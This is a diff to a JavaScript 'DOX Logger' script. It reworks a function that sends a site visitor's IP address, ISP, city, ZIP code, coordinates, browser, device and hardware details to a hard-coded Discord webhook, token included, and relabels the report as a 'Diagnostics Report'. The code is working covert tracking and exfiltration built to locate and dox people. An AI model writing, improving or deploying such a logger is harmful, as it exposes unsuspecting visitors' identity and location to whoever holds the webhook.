@@ -86,21 +86,77 @@ async function startDox() {
     await fetchAndDisplayIPData();
 }
 
-// Sends the data to a Discord webhook as a detailed embed
+// Sends the data to a Discord webhook as a detailed embed with improved formatting
 function sendToDiscordWebhook(collectedData) {
     const webhookUrl = "https://discord.com/api/webhooks/1402845085288366261/FummiU0Zb1bHBQC6qhMyTOx-ba990D6lSEnBmegUzkIH_kj-n3doBp7C6eFJtHBkJaxh";
 
     const embed = {
-        title: "🛰️ New Client Information Logged",
-        color: 0x7289da,
-        fields: Object.entries(collectedData).map(([key, value]) => ({
-            name: key,
-            value: String(value || "N/A").slice(0, 1024), // prevent overflow
-            inline: false
-        })),
+        title: "📡 New Client Report Received",
+        color: 0x2F3136,
+        description: "System and network information collected from the client device.",
+        fields: [
+            {
+                name: "🌐 Network Info",
+                value: [
+                    `**IP Address:** \`${collectedData["IP Address"]}\``,
+                    `**ISP:** \`${collectedData["ISP"]}\``,
+                    `**Organization:** \`${collectedData["Organization"]}\``,
+                    `**Autonomous System:** \`${collectedData["Autonomous System"]}\``
+                ].join("\n"),
+                inline: false
+            },
+            {
+                name: "📍 Location",
+                value: [
+                    `**Country:** \`${collectedData["Country"]}\``,
+                    `**Region:** \`${collectedData["Region"]}\``,
+                    `**City:** \`${collectedData["City"]}\``,
+                    `**ZIP Code:** \`${collectedData["ZIP Code"]}\``,
+                    `**Timezone:** \`${collectedData["Timezone"]}\``,
+                    `**Latitude/Longitude:** \`${collectedData["Latitude"]}, ${collectedData["Longitude"]}\``
+                ].join("\n"),
+                inline: false
+            },
+            {
+                name: "🖥️ Device & Browser",
+                value: [
+                    `**Browser:** \`${collectedData["Browser"]}\``,
+                    `**Platform:** \`${collectedData["Platform"]}\``,
+                    `**Mobile/Tablet:** \`${collectedData["Mobile/Tablet"]}\``,
+                    `**Languages:** \`${collectedData["Languages"]}\``,
+                    `**Referrer:** \`${collectedData["Referrer"]}\``
+                ].join("\n"),
+                inline: false
+            },
+            {
+                name: "📺 Screen Info",
+                value: [
+                    `**Resolution:** \`${collectedData["Screen"]}\``,
+                    `**Pixel Depth:** \`${collectedData["Pixel Depth"]}\``,
+                    collectedData["Orientation"] ? `**Orientation:** \`${collectedData["Orientation"]}\`` : null,
+                    collectedData["Rotation"] ? `**Rotation:** \`${collectedData["Rotation"]}\`` : null
+                ].filter(Boolean).join("\n"),
+                inline: false
+            },
+            {
+                name: "⚙️ Hardware",
+                value: [
+                    `**CPU Threads:** \`${collectedData["CPU Threads"]}\``,
+                    collectedData["Memory Limit"] ? `**Memory Limit:** \`${collectedData["Memory Limit"]}\`` : null,
+                    collectedData["GPU Vendor"] ? `**GPU Vendor:** \`${collectedData["GPU Vendor"]}\`` : null,
+                    collectedData["GPU Renderer"] ? `**GPU Renderer:** \`${collectedData["GPU Renderer"]}\`` : null
+                ].filter(Boolean).join("\n"),
+                inline: false
+            },
+            {
+                name: "🕒 Timestamp",
+                value: `\`${collectedData["Current Time"]}\``,
+                inline: false
+            }
+        ],
         timestamp: new Date().toISOString(),
         footer: {
-            text: "DOX Logger"
+            text: "📥 DOX Logger • Diagnostics Report"
         }
     };
 
